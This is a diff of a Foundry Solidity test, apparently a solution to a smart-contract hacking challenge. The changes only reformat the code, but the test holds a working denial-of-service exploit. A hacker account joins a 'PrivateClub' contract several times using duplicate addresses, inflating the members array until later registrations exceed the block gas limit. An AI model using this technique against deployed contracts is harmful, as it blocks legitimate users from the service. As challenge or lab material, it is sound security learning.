@@ -13,7 +13,7 @@ contract PrivateClubHack is Test {
     address user3 = makeAddr("user3");
     address user4 = makeAddr("user4");
     address hacker = makeAddr("hacker");
-    uint blockGasLimit = 120000;
+    uint256 blockGasLimit = 120000;
 
     function setUp() public {
         vm.deal(clubAdmin, 100 ether);
@@ -39,15 +39,15 @@ contract PrivateClubHack is Test {
         club.becomeMember{value: 2 ether}(mForUser3);
         vm.stopPrank();
     }
-    
+
     address[] private members = [hacker, hacker, hacker];
 
     function test_attack() public {
         vm.startPrank(hacker);
         // task1: become member of the club and
         // block future registrations (reason: out of gas - block gas limit)
-        // solution: 
-        for(uint i = 3; i < 8; i++) {
+        // solution:
+        for (uint256 i = 3; i < 8; i++) {
             // the members array contains the duplicate hacker address
             club.becomeMember{value: i * 1 ether}(members);
             // push hacker address into members array until out of gas
@@ -61,13 +61,13 @@ contract PrivateClubHack is Test {
         // check - user4 can not become member - blockGasLimit
         vm.startPrank(user4);
         address[] memory mForUser4 = new address[](club.membersCount());
-        for (uint i = 0; i < club.membersCount(); i++) {
+        for (uint256 i = 0; i < club.membersCount(); i++) {
             mForUser4[i] = club.members_(i);
         }
-        uint etherAmount = mForUser4.length * 1 ether;
-        uint gasleftbeforeTxStart = gasleft();
+        uint256 etherAmount = mForUser4.length * 1 ether;
+        uint256 gasleftbeforeTxStart = gasleft();
         club.becomeMember{value: etherAmount}(mForUser4);
-        uint gasleftAfterTxStart = gasleft();
+        uint256 gasleftAfterTxStart = gasleft();
         vm.stopPrank();
 
         assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
